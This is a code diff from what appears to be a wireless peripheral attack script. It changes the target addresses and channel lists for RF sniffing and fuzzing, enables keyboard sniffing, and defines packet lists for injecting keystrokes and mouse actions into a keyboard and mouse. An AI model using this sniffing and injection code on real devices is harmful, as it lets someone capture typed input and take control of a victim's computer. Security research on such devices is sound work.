@@ -52,8 +52,8 @@ common.parse_and_init()
 ----------------------------Initial analysis----------------------------
 """
 
-#Device.quick_sniff("52:d2:cb:cb:e5", [20, 40, 54, 81], common.RF_RATE_2M, 19)
-#Device.fuzz_channels("55:2d:2c:bc", common.RF_RATE_2M)
+#Device.quick_sniff("3d:99:52:9c:11", [2, 6, 14, 18, 22, 30, 34, 38, 42, 46, 50, 54, 62, 66, 68, 70, 78, 80, 82, 10, 26, 72, 74], common.RF_RATE_2M, 30)
+#Device.fuzz_channels("3d:99:52:9c", common.RF_RATE_2M)
 
 
 """
@@ -171,8 +171,6 @@ attack_edenwood_mouse = [
 qware_keyboard = Qware_Keyboard("3d:99:52:9c:12", 0x11021, 0xc5c5)
 qware_mouse= Qware_Mouse("3d:99:52:9c:11", 0x11021, 0x784e)
 
-#qware_keyboard.sniff()
-#qware_mouse.sniff()
 
 attack_qware_keyboard = [
     qware_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
@@ -187,6 +185,8 @@ attack_qware_keyboard = [
 
 attack_qware_mouse = [qware_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="fe0100ff01", scrolling_move="FF")]
 
+qware_keyboard.sniff()
+#qware_mouse.sniff()
 #qware_keyboard.spoof(attack_qware_keyboard)
 #qware_mouse.spoof(attack_qware_mouse)
 
